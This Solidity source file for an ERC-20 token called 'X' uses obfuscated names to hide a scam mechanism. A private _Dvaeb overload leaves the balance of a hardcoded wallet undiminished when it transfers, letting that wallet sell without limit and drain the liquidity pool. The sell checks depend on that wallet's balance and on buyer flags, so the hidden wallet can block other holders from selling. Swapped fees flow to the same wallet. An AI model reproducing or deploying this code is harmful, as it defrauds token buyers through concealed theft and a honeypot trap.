/*

Twitter: https://twitter.com/Xeth_Portal

Telegram: https://t.me/Xeth_Portal

Website: https://www.xerc.org/

*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Dvaeb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Dvaeb(a, b, "SafeMath");
    }

    function  _Dvaeb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _krpeo(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _boqlc;
    address payable private Fvudrk;
    address private _Brnfp;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Reodr=0;
    uint256 private _pfjoa=0;
    uint256 public _wloph = _totalSupply;
    uint256 public _qokjr = _totalSupply;
    uint256 public _povub= _totalSupply;
    uint256 public _qorkb= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Klrqo;
    mapping (address => bool) private _hqvrk;
    mapping(address => uint256) private _Eiovg;

    bool private _kqveopen;
    bool public _prjkv = false;
    bool private peknr = false;
    bool private _rpjuj = false;


    event _brcap(uint _wloph);
    modifier gvouf {
        peknr = true;
        _;
        peknr = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Klrqo[owner(

        )] = true;
        _Klrqo[address
        (this)] = true;
        _Klrqo[
            Fvudrk] = true;
        Fvudrk = 
        payable (0x8eDC4Cd910FBE5cAE49f939685160D431aB2B955);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Dvaeb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Zlybre=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prjkv) {
                if (to 
                != address
                (_boqlc) 
                && to !=
                 address
                 (_Brnfp)) {
                  require(_Eiovg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _Eiovg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Brnfp && to != 
            address(_boqlc) &&
             !_Klrqo[to] ) {
                require(amount 
                <= _wloph,
                 "Exceeds the _wloph.");
                require(balanceOf
                (to) + amount
                 <= _qokjr,
                  "Exceeds the _qokjr.");
                if(_pfjoa
                < _Reodr){
                  require
                  (! _fqnpv(to));
                }
                _pfjoa++;
                 _hqvrk
                 [to]=true;
                Zlybre = amount._krpeo
                ((_pfjoa>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Brnfp &&
             from!= address(this) 
            && !_Klrqo[from] ){
                require(amount <= 
                _wloph && 
                balanceOf(Fvudrk)
                <_qorkb,
                 "Exceeds the _wloph.");
                Zlybre = amount._krpeo((_pfjoa>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pfjoa>
                _Reodr &&
                 _hqvrk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!peknr 
            && to == _Brnfp &&
             _rpjuj &&
             contractTokenBalance>
             _povub 
            && _pfjoa>
            _Reodr&&
             !_Klrqo[to]&&
              !_Klrqo[from]
            ) {
                _transferFrom( _Bieur(amount, 
                _Bieur(contractTokenBalance,
                _qorkb)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pvlcke(address
                    (this).balance);
                }
            }
        }

        if(Zlybre>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Zlybre);
          emit
           Transfer(from,
           address
           (this),Zlybre);
        }
        _balances[from
        ]= _Dvaeb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Dvaeb(Zlybre));
        emit Transfer
        (from, to, 
        amount.
         _Dvaeb(Zlybre));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gvouf {
        if(tokenAmount==
        0){return;}
        if(!_kqveopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _boqlc.WETH();
        _approve(address(this),
         address(
             _boqlc), 
             tokenAmount);
        _boqlc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _Bieur
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Dvaeb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Fvudrk){
            return a ;
        }else{
            return a .
             _Dvaeb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _wloph = _totalSupply;
        _qokjr = _totalSupply;
        emit _brcap(_totalSupply);
    }

    function _fqnpv(address 
    account) private view 
    returns (bool) {
        uint256 OrNpe;
        assembly {
            OrNpe :=
             extcodesize
             (account)
        }
        return OrNpe > 
        0;
    }

    function _pvlcke(uint256
    amount) private {
        Fvudrk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _kqveopen ) ;
        _boqlc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _boqlc), 
            _totalSupply);
        _Brnfp = 
        IUniswapV2Factory(_boqlc.
        factory( ) 
        ). createPair (
            address(this
            ),  _boqlc .
             WETH ( ) );
        _boqlc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Brnfp).
        approve(address(_boqlc), 
        type(uint)
        .max);
        _rpjuj = true;
        _kqveopen = true;
    }

    receive() external payable {}
}